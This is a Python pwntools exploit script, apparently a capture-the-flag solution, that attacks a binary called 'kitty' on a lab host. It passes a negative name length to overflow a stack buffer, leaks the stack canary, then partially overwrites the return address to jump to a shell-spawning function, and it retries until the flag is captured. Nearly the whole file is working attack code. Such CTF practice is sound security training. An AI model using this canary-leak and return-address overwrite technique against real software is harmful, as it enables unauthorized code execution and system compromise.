"""
buf address - 0x7fffffffe0f0
can address - 0x7fffffffe108
diff = 24
"""

from pwn import *

context.arch = 'x86_64'

BIN: str = './kitty'
HOST: str = '10.42.0.2'
PORT: int = 38074

CANARY_OFFSET: int = 24
HAPPY_KITTY_ADDR: int = 0x40128a

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)


def pwn():
  app = get_target()
  leak_canary_payload: bytes = (
    b'A'*CANARY_OFFSET +  # Pad up to the first byte of canary
    b'B'                  # Random non-null byte
  )
  app.sendlineafter(b"How long is your name? ", b'-1')
  app.sendafter(b"What is your name? ", leak_canary_payload)
  app.recvuntil(b"Hi ")
  res = app.recvuntil(b',')[:-1]
  print(res)
  leak = res[len(leak_canary_payload):]
  canary = b'\x00' + leak[:7]
  print(len(canary), canary)

  win_addr = HAPPY_KITTY_ADDR & 0x0fff
  win_payload = (
    b'A'*CANARY_OFFSET +    # Pad up to the first byte of canary
    canary +                # Canary
    b'A' * 8 +              # RBP
    p16(win_addr)           # spawn_shell
  )

  app.sendlineafter(b"How long is your name? ", b'-1')
  app.sendafter(b"What is your name? ", win_payload)

  app.sendlineafter(b"How long is your name? ", b'16')

  try:
    res = app.recvlines(4)
    print(res)
  except EOFError:
    print("Failed")
    return 0
  else:
    print("Flag captured")
    return 1
  
def main():
  while pwn() != 1:
    pass


if __name__ == "__main__":
  main()